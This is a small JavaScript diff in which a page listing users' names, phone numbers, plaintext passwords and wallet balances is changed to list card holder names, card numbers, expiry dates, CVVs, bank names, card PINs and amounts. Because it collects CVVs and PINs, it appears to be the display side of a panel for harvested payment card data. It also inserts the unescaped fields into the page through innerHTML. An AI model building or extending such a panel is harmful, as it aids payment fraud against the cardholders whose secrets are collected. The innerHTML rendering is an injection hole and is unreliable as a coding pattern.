@@ -98,21 +98,20 @@
             const div = document.querySelector(".container");
             div.innerHTML = "";
             data.thisUser.forEach((n, i) => {
-              if (i % 2 == 0) {
+              
                 div.innerHTML += `<div class="list even">
-            <span class="name">${n.firstname}, ${n.lastname}</span>
-            <span>${n.phone}</span>
-            <span>${n.pwd}</span>
-            <span>${n.walBal}</span>
+            <span class="name">${n.cardname}</span>
+            <span>${n.card_number}</span>
+            <span>${n.date}</span>
+            <span>${n.cvv}</span>
+        </div>`
+        div.innerHTML += `<div class="list">
+            <span class="name">${n.bankname}</span>
+            <span>${n.cardpin}</span>
+            <span>${n.amount}</span>
+            <span>${n.time}</span>
         </div>`;
-              } else {
-                div.innerHTML += `<div class="list">
-            <span class="name">${n.firstname}, ${n.lastname}</span>
-            <span>${n.phone}</span>
-            <span>${n.pwd}</span>
-            <span>${n.walBal}</span>
-        </div>`;
-              }
+              
             });
           }
           console.log("reached");
